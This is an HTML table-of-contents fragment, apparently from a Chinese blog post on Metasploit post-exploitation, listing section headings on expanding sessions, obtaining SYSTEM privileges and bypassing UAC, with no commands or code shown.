+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Msf后渗透测试阶段"><span class="nav-number">1.</span> <span class="nav-text">1. Msf后渗透测试阶段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-基于已有session扩大战果"><span class="nav-number">2.</span> <span class="nav-text">2. 基于已有session扩大战果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-获取system账号权限"><span class="nav-number">3.</span> <span class="nav-text">3. 获取system账号权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-绕过UAC限制-1"><span class="nav-number">4.</span> <span class="nav-text">4. 绕过UAC限制-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-绕过UAC限制-2"><span class="nav-number">5.</span> <span class="nav-text">5. 绕过UAC限制-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-绕过UAC限制-3"><span class="nav-number">6.</span> <span class="nav-text">6. 绕过UAC限制-3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-UAC利用"><span class="nav-number">7.</span> <span class="nav-text">7. UAC利用</span></a></li></ol></div>
             
 
           </div>
